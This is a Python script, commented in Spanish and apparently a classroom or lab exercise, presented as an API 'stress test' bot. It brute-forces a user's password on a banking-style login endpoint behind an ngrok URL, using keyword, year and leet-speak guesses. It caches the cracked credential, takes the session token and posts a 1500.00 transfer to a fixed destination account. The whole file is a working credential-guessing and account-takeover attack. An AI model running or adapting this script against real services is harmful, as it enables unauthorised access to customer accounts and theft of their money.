"""
Módulo de Simulación de Prueba de Estrés / Bot de Evaluación para la API
-------------------------------------------------------------------------
Descripción: Realiza pruebas de autenticación heurística y ejecuta 
             transferencias simuladas directamente contra los endpoints de FastAPI.
VERSIÓN:  1.1
"""

import requests
import time

# ==========================================
# CONFIGURACIÓN DE ENDPOINTS Y RED
# ==========================================
# URL base expuesta mediante el túnel de ngrok
API_BASE = "https://statue-essential-dirtiness.ngrok-free.dev"

# Endpoints de la API REST de FastAPI
LOGIN_URL = f"{API_BASE}/api/v1/auth/login"
TRANSFER_URL = f"{API_BASE}/api/v1/transactions/transfer"

# Usuario objetivo para la prueba de acceso
TARGET_USER = "cliente_001"

# Cabeceras HTTP estándar para peticiones JSON
# 'ngrok-skip-browser-warning' omite la pantalla de advertencia intermedia de ngrok
HEADERS = {
    "Content-Type": "application/json",
    "ngrok-skip-browser-warning": "true"
}

# ==========================================
# DICCIONARIO Y PATRONES HEURÍSTICOS
# ==========================================
KNOWN_CREDENTIALS = {}

CONTEXT_KEYWORDS = ["Banco", "Secure"]
YEARS = ["2024", "2026"]
SYMBOLS = ["$", "#"]

def generate_passwords():
    """
    Genera combinaciones candidatas de contraseñas basándose en palabras clave,
    reemplazos leet-speak (e -> 3, s -> $) y sufijos habituales.
    
    Returns:
        list[str]: Lista de variaciones de contraseñas a evaluar.
    """
    generated = set()
    for base in CONTEXT_KEYWORDS:
        for yr in YEARS:
            for sym in SYMBOLS:
                # Sustitución leet para simular variaciones comunes
                leet = base.replace('e', '3').replace('s', '$')
                generated.add(f"{base}{yr}")
                generated.add(f"{leet}{sym}{yr}")
                generated.add(f"Banco$ecure#{yr}")
    return list(generated)

def run_api_bot():
    print(f"🤖 [BOT API] Iniciando verificación para usuario: {TARGET_USER}")

    # 1. Verificar si la contraseña ya fue descubierta previamente
    if TARGET_USER in KNOWN_CREDENTIALS:
        valid_password = KNOWN_CREDENTIALS[TARGET_USER]
        print(f"⚡ [CACHÉ LOG] Contraseña conocida encontrada en memoria: '{valid_password}'")
        print("⏩ Saltando ejecución del algoritmo heurístico de fuerza bruta.\n")
        execute_login_and_transfer(TARGET_USER, valid_password)
        return
    
    #2. Si no se conoce, ejecutar algoritmo heuristico
    print("🔍 Contraseña no registrada. Ejecutando algoritmo de prueba heurística...\n")
    candidates = generate_passwords()

    for attempt, pwd in enumerate(candidates, 1):
        login_payload = {"username": TARGET_USER, "password": pwd}
        try:
            response = requests.post(LOGIN_URL, json=login_payload, headers=HEADERS, timeout=5)
            if response.status_code == 200:
                print(f"✅ [Intento {attempt}] ¡Contraseña identificada!: '{pwd}'")
                
                # Guardar en el diccionario para futuras ejecuciones
                KNOWN_CREDENTIALS[TARGET_USER] = pwd
                print(f"💾 Credencial guardada en el diccionario de credenciales conocidas.")
                
                execute_login_and_transfer(TARGET_USER, pwd, response.json())
                return
            else:
                print(f"❌ [Intento {attempt}] Rechazado (HTTP {response.status_code}) -> '{pwd}'")
        except Exception as e:
            print(f"⚠️ Error de conexión en intento {attempt}: {e}")

        time.sleep(0.4)

    print("\n❌ Finalizado: Ninguna contraseña logró autenticarse.")

def execute_login_and_transfer(username, password, login_data=None):
    if not login_data:
        resp = requests.post(LOGIN_URL, json={"username": username, "password": password}, headers=HEADERS)
        login_data = resp.json()

    headers_tx = HEADERS.copy()
    token = login_data.get("token") or login_data.get("access_token")
    if token:
        headers_tx["Authorization"] = f"Bearer {token}"

    source_account = login_data.get("account_id", "MX-4821-0001")
    transfer_payload = {
        "account_id": source_account,
        "destination_account": "MX-9012-3344",
        "amount": 1500.00
    }

    print(f"💸 Ejecutando transferencia con sesión validada: {transfer_payload}")
    tx_resp = requests.post(TRANSFER_URL, json=transfer_payload, headers=headers_tx, timeout=5)
    print(f"📊 Respuesta Transferencia: HTTP {tx_resp.status_code}")

if __name__ == "__main__":
    run_api_bot()